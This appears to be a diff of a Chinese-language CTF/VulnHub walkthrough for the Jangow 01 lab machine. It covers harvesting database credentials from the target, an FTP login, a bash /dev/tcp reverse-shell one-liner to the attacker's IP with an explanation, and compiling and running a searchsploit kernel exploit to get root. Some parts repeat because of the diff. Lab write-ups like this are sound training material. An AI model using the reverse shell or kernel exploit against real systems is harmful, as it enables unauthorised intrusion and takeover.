-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-116 <span style="color:#ff6ac1">(</span>Ubuntu 16.04.4<span style="color:#ff6ac1">)</span> - Local Privilege Escalation                                                  | linux/local/44298.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-21 <span style="color:#ff6ac1">(</span>Ubuntu 16.04 x64<span style="color:#ff6ac1">)</span> - <span style="color:#5af78e">&#39;netfilter target_offset&#39;</span> Local Privilege Escalation                       | linux_x86-64/local/44300.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04<span style="color:#ff6ac1">)</span> - Local Privilege Escalation <span style="color:#ff6ac1">(</span>KASLR / SMEP<span style="color:#ff6ac1">)</span>                   | linux/local/43418.c
-</span></span><span style="display:flex;"><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style="color:#ff6ac1">(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style="color:#ff6ac1">)</span> - Local Privilege Escalation <span style="color:#ff6ac1">(</span>KASLR / SMEP<span style="color:#ff6ac1">)</span> | linux/local/47169.c
-</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-</span></span><span style="display:flex;"><span>Shellcodes: No Results</span></span></code></pre></div><p>这里选用内核版本的第一个<code>45010.c</code>（其后面介绍local privilege escalation），将其下载到本地<code>searchsploit -m 45010</code>，再<code>gcc 45010.c -o exp1</code>编译
-将文件拖出到宿主机，接着放入蚁剑里，赋予权限<code>chmod +x exp1</code>，再用<code>ls -al</code>查看文件，再<code>./exp1</code>执行，</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span><span style="color:#ff6ac1">(</span>www-data:/var/www/html/site<span style="color:#ff6ac1">)</span> $ chmod +x exp1
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">(</span>www-data:/var/www/html/site<span style="color:#ff6ac1">)</span> $ ls -al
-</span></span><span style="display:flex;"><span>total <span style="color:#ff9f43">68</span>
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">6</span> www-data www-data  <span style="color:#ff9f43">4096</span> Feb  <span style="color:#ff9f43">3</span> 12:48 .
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">3</span> root     root      <span style="color:#ff9f43">4096</span> Oct <span style="color:#ff9f43">31</span>  <span style="color:#ff9f43">2021</span> ..
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">3</span> www-data www-data  <span style="color:#ff9f43">4096</span> Jun  <span style="color:#ff9f43">3</span>  <span style="color:#ff9f43">2021</span> assets
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ff9f43">1</span> www-data www-data    <span style="color:#ff9f43">35</span> Jun <span style="color:#ff9f43">10</span>  <span style="color:#ff9f43">2021</span> busque.php
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">2</span> www-data www-data  <span style="color:#ff9f43">4096</span> Jun  <span style="color:#ff9f43">3</span>  <span style="color:#ff9f43">2021</span> css
-</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ff9f43">1</span> www-data www-data <span style="color:#ff9f43">21616</span> Feb  <span style="color:#ff9f43">3</span> 12:48 exp1
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ff9f43">1</span> www-data www-data <span style="color:#ff9f43">10190</span> Jun <span style="color:#ff9f43">10</span>  <span style="color:#ff9f43">2021</span> index.html
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">2</span> www-data www-data  <span style="color:#ff9f43">4096</span> Jun  <span style="color:#ff9f43">3</span>  <span style="color:#ff9f43">2021</span> js
-</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ff9f43">1</span> www-data www-data    <span style="color:#ff9f43">30</span> Feb  <span style="color:#ff9f43">3</span> 10:49 shell.php
-</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ff9f43">2</span> www-data www-data  <span style="color:#ff9f43">4096</span> Jun <span style="color:#ff9f43">10</span>  <span style="color:#ff9f43">2021</span> wordpress
-</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">(</span>www-data:/var/www/html/site<span style="color:#ff6ac1">)</span> $ ./exp1
-</span></span><span style="display:flex;"><span>./exp1: /lib/x86_64-linux-gnu/libc.so.6: version <span style="color:#5af78e">`</span>GLIBC_2.34<span style="color:#ff5c57">&#39;</span> not found <span style="color:#ff6ac1">(</span>required by ./exp1<span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>最后报错，<code>GLIBC_2.34</code>没找到，这是由于我在最新的kali linux上编译了程序，但靶机是Ubuntu 16.04，它携带的GLIBC版本远低于2.34，无法满足程序运行的需求</p>
-<p>解决思路：让靶机自己编译<code>45010.c</code>
-因此拖拽45010.c文件到蚁剑里</p>
-<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>www-data@jangow01:/etc$ <span style="color:#ff5c57">cd</span> /var/www/html/site/
-</span></span><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ gcc 45010.c -o exp1
-</span></span><span style="display:flex;"><span>gcc 45010.c -o exp1
-</span></span><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ chmod +x exp1
-</span></span><span style="display:flex;"><span>chmod +x exp1
-</span></span><span style="display:flex;"><span>www-data@jangow01:/var/www/html/site$ ./exp1
-</span></span><span style="display:flex;"><span>./exp1
-</span></span><span style="display:flex;"><span>id
-</span></span><span style="display:flex;"><span><span style="color:#ff5c57">uid</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">gid</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">groups</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span>,33<span style="color:#ff6ac1">(</span>www-data<span style="color:#ff6ac1">)</span></span></span></code></pre></div><p>提权成功</p>
-<h2 id="八总结">八、总结<a class="anchor" href="#%e5%85%ab%e6%80%bb%e7%bb%93">#</a></h2>
-<p>总体思路是先进行端口扫描，接着进行网页勘察，接着发现注入漏洞，注入一句话木马，利用蚁剑尝试反弹shell，根据内核版本查找提权的漏洞，接着将病毒源代码放入靶机编译执行，提权</p>
-</article>
- 
-      
-
-      <footer class="book-footer">
-        
-  <div class="flex flex-wrap justify-between">
-
-<div>
-<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/550a5ca8fc8b807219ecbc1c32a2b3a69fb958d2" title='Last modified by vnccer | May 26, 2026' target="_blank" rel="noopener">
-    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
-    <span>May 26, 2026</span>
-  </a>
-
-</div>
-
-<div>
-
-</div>
-
-</div>
-
-
-
-
-
-  
-  
-  
-  <div class="flex flex-wrap justify-between">
-    <span>
-    
-      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_ICA_1/" class="flex align-center">
-        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
-        <span>ICA: 1</span>
-      </a>
-    
-    </span>
-    <span>
-    
-      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Napping-1.0.1/" class="flex align-center">
-        <span>Napping: 1.0.1</span>
-        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
-      </a>
-    
-    </span>
-  </div>
-  
-
-
- 
-        
-  
-  <div class="book-comments">
-
-</div>
-  
- 
-        
-        
-  
-  <div class="book-copyright flex justify-center">
-    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
-  </div>
-  
- 
-        
-  
-  
-    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
-  
-
-      </footer>
-
-      <label for="menu-control" class="hidden book-menu-overlay"></label>
-    </div>
-
-    
-  
-  <aside class="book-toc">
-    <div class="book-toc-content">
-      
-  
-<nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#一靶机网卡修复">一、靶机网卡修复</a></li>
-        <li><a href="#二识别靶机ip">二、识别靶机ip</a></li>
-        <li><a href="#三端口扫描nmap">三、端口扫描nmap</a></li>
-        <li><a href="#四获得shell失败">四、获得shell（失败）</a>
-          <ul>
-            <li><a href="#searchsploit">searchsploit</a></li>
-            <li><a href="#ftp">FTP</a></li>
-          </ul>
-        </li>
-        <li><a href="#五http扫描">五、HTTP扫描</a>
-          <ul>
-            <li><a href="#nikto">nikto</a></li>
-            <li><a href="#目录扫描dirb">目录扫描dirb</a></li>
-            <li><a href="#wpscan">wpscan</a></li>
-            <li><a href="#gobuster">gobuster</a></li>
-            <li><a href="#网页url">网页URL</a></li>
-          </ul>
-        </li>
-        <li><a href="#六反弹shell">六、反弹shell</a></li>
-        <li><a href="#七提权">七、提权</a></li>
-        <li><a href="#八总结">八、总结</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-
-
-
-    </div>
-  </aside>
-  
- 
-  </main>
-
-  
-</body>
-</html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+接着用蚁剑连接，连接成功，开始翻垃圾</p><p><code>/var/www/html/site/wordpress/config.php</code>中找到神秘内容</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#ff5c57>$servername</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;localhost&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$database</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;desafio02&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$username</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;desafio02&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$password</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;abygurl69&#34;</span>;</span></span></code></pre></div><p><code>/var/www/html/.backup</code>中同样神秘内容</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#ff5c57>$servername</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;localhost&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$database</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;jangow01&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$username</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;jangow01&#34;</span>;
+</span></span><span style=display:flex><span><span style=color:#ff5c57>$password</span> <span style=color:#ff6ac1>=</span> <span style=color:#5af78e>&#34;abygurl69&#34;</span>;</span></span></code></pre></div><p><strong>再回过头看</strong>，nmap扫描，有21、80端口，接着目录扫描没找到什么，接着通过蚁剑找到两套php，因此这里试一下21端口。
+使用<code>.backup</code>中账户密码，登场登录</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ ftp 192.168.203.136
+</span></span><span style=display:flex><span>Connected to 192.168.203.136.
+</span></span><span style=display:flex><span><span style=color:#ff9f43>220</span> <span style=color:#ff6ac1>(</span>vsFTPd 3.0.3<span style=color:#ff6ac1>)</span>
+</span></span><span style=display:flex><span>Name <span style=color:#ff6ac1>(</span>192.168.203.136:kali<span style=color:#ff6ac1>)</span>: jangow01
+</span></span><span style=display:flex><span><span style=color:#ff9f43>331</span> Please specify the password.
+</span></span><span style=display:flex><span>Password: 
+</span></span><span style=display:flex><span><span style=color:#ff9f43>230</span> Login successful.
+</span></span><span style=display:flex><span>Remote system <span style=color:#ff5c57>type</span> is UNIX.
+</span></span><span style=display:flex><span>Using binary mode to transfer files.
+</span></span><span style=display:flex><span>ftp&gt; </span></span></code></pre></div><h2 id=六反弹shell>六、反弹shell<a class=anchor href=#%e5%85%ad%e5%8f%8d%e5%bc%b9shell>#</a></h2><p>kali中开启监听，用443端口，因为靶机只能用443（不理解）
+<code>nc -lvvp 443</code></p><p>接着去蚁剑打开靶机终端
+<code>bash -c 'bash -i >& /dev/tcp/192.168.203.129/443 0>&amp;1'</code></p><ul><li><code>bash -c</code>告诉bash解释器执行后面引号里的字符串命令</li><li><code>bash -i</code>启动一个交互式的bash窗口</li><li><code>>&</code>是重定向组合符，将标准输出和标准错误都发送到同一个地方</li><li><code>/dev/tcp/192.168.203.129/443</code>不代表硬盘上的文件，而是尝试与ip为<code>192.168.203.129</code>的443端口建立一个tcp网络连接</li><li><code>0>&amp;1</code>是双向绑定，<code>0</code>代表标准输入，<code>1</code>代表标准输出，将我的输入也绑定到网络连接上，这样从kali发送的指令，目标机能接收并执行</li><li>注（这里的ip地址是kali的地址，蚁剑进入的是靶机的端口，反弹shell）</li></ul><p>成功反弹shell</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ nc -lvvp <span style=color:#ff9f43>443</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#ff6ac1>[</span>any<span style=color:#ff6ac1>]</span> <span style=color:#ff9f43>443</span> ...
+</span></span><span style=display:flex><span>192.168.203.136: inverse host lookup failed: Unknown host
+</span></span><span style=display:flex><span>connect to <span style=color:#ff6ac1>[</span>192.168.203.129<span style=color:#ff6ac1>]</span> from <span style=color:#ff6ac1>(</span>UNKNOWN<span style=color:#ff6ac1>)</span> <span style=color:#ff6ac1>[</span>192.168.203.136<span style=color:#ff6ac1>]</span> <span style=color:#ff9f43>52824</span>
+</span></span><span style=display:flex><span>bash: cannot <span style=color:#ff5c57>set</span> terminal process group <span style=color:#ff6ac1>(</span>3862<span style=color:#ff6ac1>)</span>: Inappropriate ioctl <span style=color:#ff6ac1>for</span> device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ </span></span></code></pre></div><h2 id=七提权>七、提权<a class=anchor href=#%e4%b8%83%e6%8f%90%e6%9d%83>#</a></h2><p>当前权限为www-data权限，需要提权
+先查看内核版本和发行版本</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ uname -a
+</span></span><span style=display:flex><span>uname -a
+</span></span><span style=display:flex><span>Linux jangow01 4.4.0-31-generic <span style=color:#78787e>#50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style=display:flex><span>www-data@jangow01:/var/www/html/site$ lsb_release -a
+</span></span><span style=display:flex><span>lsb_release -a
+</span></span><span style=display:flex><span>No LSB modules are available.
+</span></span><span style=display:flex><span>Distributor ID: Ubuntu
+</span></span><span style=display:flex><span>Description:    Ubuntu 16.04.1 LTS
+</span></span><span style=display:flex><span>Release:        16.04
+</span></span><span style=display:flex><span>Codename:       xenial</span></span></code></pre></div><p>接着进行searchsploit搜索漏洞：</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ searchsploit ubuntu 4.4.0-31 --overflow
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                                                                          |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Linux Kernel 4.10.5 / &lt; 4.14.3 <span style=color:#ff6ac1>(</span>Ubuntu<span style=color:#ff6ac1>)</span> - DCCP Socket Use-After-Free                                                    | linux/dos/43234.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04 x64<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.13.9 <span style=color:#ff6ac1>(</span>Ubuntu 16.04 / Fedora 27<span style=color:#ff6ac1>)</span> - Local Privilege Escalation                                           | linux/local/45010.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-116 <span style=color:#ff6ac1>(</span>Ubuntu 16.04.4<span style=color:#ff6ac1>)</span> - Local Privilege Escalation                                                  | linux/local/44298.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04<span style=color:#ff6ac1>)</span> - Local Privilege Escalation <span style=color:#ff6ac1>(</span>KASLR / SMEP<span style=color:#ff6ac1>)</span>                   | linux/local/43418.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style=color:#ff6ac1>)</span> - Local Privilege Escalation <span style=color:#ff6ac1>(</span>KASLR / SMEP<span style=color:#ff6ac1>)</span> | linux/local/47169.c
+</span></span><span style=display:flex><span>Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                  | linux/local/41760.txt
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>┌──<span style=color:#ff6ac1>(</span>kali㉿kali<span style=color:#ff6ac1>)</span>-<span style=color:#ff6ac1>[</span>~<span style=color:#ff6ac1>]</span>
+</span></span><span style=display:flex><span>└─$ searchsploit ubuntu 16.04 --overflow
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span> Exploit Title                                                                                                          |  Path
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Apport 2.x <span style=color:#ff6ac1>(</span>Ubuntu Desktop 12.10 &lt; 16.04<span style=color:#ff6ac1>)</span> - Local Code Execution                                                        | linux/local/40937.txt
+</span></span><span style=display:flex><span>Exim <span style=color:#ff9f43>4</span> <span style=color:#ff6ac1>(</span>Debian <span style=color:#ff9f43>8</span> / Ubuntu 16.04<span style=color:#ff6ac1>)</span> - Spool Privilege Escalation                                                           | linux/local/40054.c
+</span></span><span style=display:flex><span>Google Chrome <span style=color:#ff6ac1>(</span>Fedora <span style=color:#ff9f43>25</span> / Ubuntu 16.04<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;tracker-extract&#39;</span> / <span style=color:#5af78e>&#39;gnome-video-thumbnailer&#39;</span> + <span style=color:#5af78e>&#39;totem&#39;</span> Drive-By Download    | linux/local/40943.txt
+</span></span><span style=display:flex><span>LightDM <span style=color:#ff6ac1>(</span>Ubuntu 16.04/16.10<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;Guest Account&#39;</span> Local Privilege Escalation                                               | linux/local/41923.txt
+</span></span><span style=display:flex><span>Linux Kernel <span style=color:#ff6ac1>(</span>Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / CentOS 7.3.1611<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;ldso_hwcap_64 Stack Clash&#39;</span> Local Privilege Escalation | linux_x86-64/local/42275.c
+</span></span><span style=display:flex><span>Linux Kernel <span style=color:#ff6ac1>(</span>Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;ldso_dynamic Stack Clash&#39;</span> Local Privilege Escalation | linux_x86/local/42276.c
+</span></span><span style=display:flex><span>Linux Kernel <span style=color:#ff6ac1>(</span>Ubuntu 16.04<span style=color:#ff6ac1>)</span> - Reference Count Overflow Using BPF Maps                                                   | linux/dos/39773.txt
+</span></span><span style=display:flex><span>Linux Kernel 4.14.7 <span style=color:#ff6ac1>(</span>Ubuntu 16.04 / CentOS 7<span style=color:#ff6ac1>)</span> - <span style=color:#ff6ac1>(</span>KASLR &amp; SMEP Bypass<span style=color:#ff6ac1>)</span> Arbitrary File Read                               | linux/local/45175.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4 <span style=color:#ff6ac1>(</span>Ubuntu 16.04<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;BPF&#39;</span> Local Privilege Escalation <span style=color:#ff6ac1>(</span>Metasploit<span style=color:#ff6ac1>)</span>                                         | linux/local/40759.rb
+</span></span><span style=display:flex><span>Linux Kernel 4.4 <span style=color:#ff6ac1>(</span>Ubuntu 16.04<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;snd_timer_user_ccallback()&#39;</span> Kernel Pointer Leak                                      | linux/dos/46529.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4.0 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04 x86-64<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation                        | linux_x86-64/local/40871.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4.0-21 <span style=color:#ff6ac1>(</span>Ubuntu 16.04 x64<span style=color:#ff6ac1>)</span> - Netfilter <span style=color:#5af78e>&#39;target_offset&#39;</span> Out-of-Bounds Privilege Escalation                 | linux_x86-64/local/40049.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4.0-21 &lt; 4.4.0-51 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04 x64<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;AF_PACKET&#39;</span> Race Condition Privilege Escalation             | windows_x86-64/local/47170.c
+</span></span><span style=display:flex><span>Linux Kernel 4.4.x <span style=color:#ff6ac1>(</span>Ubuntu 16.04<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;double-fdput()&#39;</span> bpf<span style=color:#ff6ac1>(</span>BPF_PROG_LOAD<span style=color:#ff6ac1>)</span> Privilege Escalation                            | linux/local/39772.txt
+</span></span><span style=display:flex><span>Linux Kernel 4.6.2 <span style=color:#ff6ac1>(</span>Ubuntu 16.04.1<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;IP6T_SO_SET_REPLACE&#39;</span> Local Privilege Escalation                                  | linux/local/40489.txt
+</span></span><span style=display:flex><span>Linux Kernel 4.8 <span style=color:#ff6ac1>(</span>Ubuntu 16.04<span style=color:#ff6ac1>)</span> - Leak sctp Kernel Pointer                                                              | linux/dos/45919.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.13.9 <span style=color:#ff6ac1>(</span>Ubuntu 16.04 / Fedora 27<span style=color:#ff6ac1>)</span> - Local Privilege Escalation                                           | linux/local/45010.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-116 <span style=color:#ff6ac1>(</span>Ubuntu 16.04.4<span style=color:#ff6ac1>)</span> - Local Privilege Escalation                                                  | linux/local/44298.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-21 <span style=color:#ff6ac1>(</span>Ubuntu 16.04 x64<span style=color:#ff6ac1>)</span> - <span style=color:#5af78e>&#39;netfilter target_offset&#39;</span> Local Privilege Escalation                       | linux_x86-64/local/44300.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04<span style=color:#ff6ac1>)</span> - Local Privilege Escalation <span style=color:#ff6ac1>(</span>KASLR / SMEP<span style=color:#ff6ac1>)</span>                   | linux/local/43418.c
+</span></span><span style=display:flex><span>Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 <span style=color:#ff6ac1>(</span>Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin<span style=color:#ff6ac1>)</span> - Local Privilege Escalation <span style=color:#ff6ac1>(</span>KASLR / SMEP<span style=color:#ff6ac1>)</span> | linux/local/47169.c
+</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+</span></span><span style=display:flex><span>Shellcodes: No Results</span></span></code></pre></div><p>这里选用内核版本的第一个<code>45010.c</code>（其后面介绍local privilege escalation），将其下载到本地<code>searchsploit -m 45010</code>，再<code>gcc 45010.c -o exp1</code>编译
+将文件拖出到宿主机，接着放入蚁剑里，赋予权限<code>chmod +x exp1</code>，再用<code>ls -al</code>查看文件，再<code>./exp1</code>执行，</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span><span style=color:#ff6ac1>(</span>www-data:/var/www/html/site<span style=color:#ff6ac1>)</span> $ chmod +x exp1
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>(</span>www-data:/var/www/html/site<span style=color:#ff6ac1>)</span> $ ls -al
+</span></span><span style=display:flex><span>total <span style=color:#ff9f43>68</span>
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>6</span> www-data www-data  <span style=color:#ff9f43>4096</span> Feb  <span style=color:#ff9f43>3</span> 12:48 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>3</span> root     root      <span style=color:#ff9f43>4096</span> Oct <span style=color:#ff9f43>31</span>  <span style=color:#ff9f43>2021</span> ..
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>3</span> www-data www-data  <span style=color:#ff9f43>4096</span> Jun  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2021</span> assets
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ff9f43>1</span> www-data www-data    <span style=color:#ff9f43>35</span> Jun <span style=color:#ff9f43>10</span>  <span style=color:#ff9f43>2021</span> busque.php
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>2</span> www-data www-data  <span style=color:#ff9f43>4096</span> Jun  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2021</span> css
+</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ff9f43>1</span> www-data www-data <span style=color:#ff9f43>21616</span> Feb  <span style=color:#ff9f43>3</span> 12:48 exp1
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ff9f43>1</span> www-data www-data <span style=color:#ff9f43>10190</span> Jun <span style=color:#ff9f43>10</span>  <span style=color:#ff9f43>2021</span> index.html
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>2</span> www-data www-data  <span style=color:#ff9f43>4096</span> Jun  <span style=color:#ff9f43>3</span>  <span style=color:#ff9f43>2021</span> js
+</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ff9f43>1</span> www-data www-data    <span style=color:#ff9f43>30</span> Feb  <span style=color:#ff9f43>3</span> 10:49 shell.php
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ff9f43>2</span> www-data www-data  <span style=color:#ff9f43>4096</span> Jun <span style=color:#ff9f43>10</span>  <span style=color:#ff9f43>2021</span> wordpress
+</span></span><span style=display:flex><span><span style=color:#ff6ac1>(</span>www-data:/var/www/html/site<span style=color:#ff6ac1>)</span> $ ./exp1
